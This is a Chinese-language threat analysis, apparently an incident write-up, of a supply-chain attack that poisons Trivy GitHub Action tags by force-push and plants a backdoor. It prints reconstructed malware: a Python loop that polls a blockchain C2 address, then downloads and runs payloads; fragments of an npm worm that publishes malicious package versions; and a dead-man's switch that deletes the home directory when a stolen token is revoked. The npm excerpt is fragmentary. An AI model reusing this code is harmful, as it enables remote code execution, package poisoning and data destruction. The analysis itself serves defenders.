二、第一阶段：Trivy 安全扫描器供应链投毒

2.1 攻击入口：Git 标签 Force-Push

TeamPCP 利用此前 2026年2月的一次 GitHub Actions pull_request_target 工作流配置错误事件，窃取了一个个人访问令牌（PAT）。2月事件后凭证轮换不完整，残留的认证材料被用于执行3月19日的攻击。

利用该被盗 PAT，攻击者对 aquasecurity/trivy-action 仓库执行了 git force-push，将 76 个版本标签中的 75 个重新指向恶意 commit；同时对 aquasecurity/setup-trivy 的 7 个标签执行同样操作。

# 攻击者的 force-push 操作（概念示意）
# 正常的 Git 标签是不可变的，但 force-push 可以重新指向
git tag -f v0.69.4 malicious-commit-hash
git push origin v0.69.4 --force  # 覆盖已有标签

# 受影响的标签
# aquasecurity/trivy-action: 76 个标签中的 75 个被投毒
# aquasecurity/setup-trivy: 全部 7 个标签被投毒

关键影响：Trivy GitHub Action 被引用在估计 10,000+ 个 GitHub 工作流文件中。所有引用这些标签的 CI/CD 流水线在执行安全扫描时实际运行的是恶意代码。

3.2 ICP 区块链 C2 基础设施

CanisterWorm 最独特的技术创新是使用 Internet Computer (ICP) 区块链 canister 作为 C2 基础设施。

# CanisterWorm Python 后门 C2 轮询逻辑（逆向还原）

import requests
import time
import os
import stat

CANISTER_ID = "tdtqy-oyaaa-aaaae-af2dq-cai"
C2_URL = f"https://{CANISTER_ID}.raw.icp0.io/"
STATE_FILE = "/tmp/.pg_state"
PAYLOAD_PATH = "/tmp/pglog"

def beacon():
    """每 ~50 分钟向 ICP canister 发送信标"""
    time.sleep(300)  # 初始休眠 5 分钟（沙箱规避）

    while True:
        try:
            # 获取当前载荷 URL
            response = requests.get(
                C2_URL,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=30
            )
            payload_url = response.text.strip()

            # Kill switch: URL 包含 youtube.com 则跳过
            if "youtube.com" in payload_url:
                time.sleep(3000)
                continue

            # 检查是否已执行过此 URL
            if os.path.exists(STATE_FILE):
                with open(STATE_FILE, "r") as f:
                    executed_urls = f.read()
                if payload_url in executed_urls:
                    time.sleep(3000)
                    continue

            # 下载载荷
            payload = requests.get(payload_url, timeout=60)
            with open(PAYLOAD_PATH, "wb") as f:
                f.write(payload.content)

            # 设置可执行权限
            os.chmod(PAYLOAD_PATH, stat.S_IRWXU)

            # 以分离进程启动
            os.system(f"nohup {PAYLOAD_PATH} > /dev/null 2>&1 &")

            # 记录已执行 URL
            with open(STATE_FILE, "a") as f:
                f.write(payload_url + "\n")

        except Exception:
            pass

        time.sleep(3000)  # ~50 分钟间隔

ICP 是 DFINITY Foundation 开发的去中心化区块链网络。Canister 是防篡改的 WebAssembly 智能合约，运行在分布式节点网络上，无单一托管提供商。传统执法请求无效。

Kill Switch：发现时 canister 正返回 YouTube 重定向 URL，意味着最终载荷阶段处于休眠状态，但完整的基础设施已在受感染机器上就位。

const fs = require('fs');

    // Step 3: 对每个包发布恶意版本

        // 下载原始 tarball
        const tarball = await downloadTarball(pkg.name, pkg.version);

            fs.readFileSync(path.join(tarball.extractPath, 'package.json'))

            path.join(__dirname, 'malicious-index.js'),

        await npm.commands.publish(['--tag', 'latest']);

            path.join(tarball.extractPath, 'package.json'),

4.6 Dead-Man's Switch（死人开关）

载荷实现破坏性 gh-token-monitor 作为死人开关：

# gh-token-monitor — 死人开关（每 60 秒轮询）

import time
import subprocess
import os

STOLEN_TOKEN = os.environ.get("GH_TOKEN", "")

while True:
    result = subprocess.run(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
         "-H", f"Authorization: token {STOLEN_TOKEN}",
         "https://api.github.com/user"],
        capture_output=True, text=True
    )

    status_code = result.stdout.strip()

    # 如果令牌被撤销 (40x)，执行破坏性清除
    if status_code.startswith("40"):
        subprocess.run(["rm", "-rf", os.path.expanduser("~")])
        break

    time.sleep(60)

防御者困境：必须在撤销令牌之前优先消除持久化，否则会触发破坏性清除。
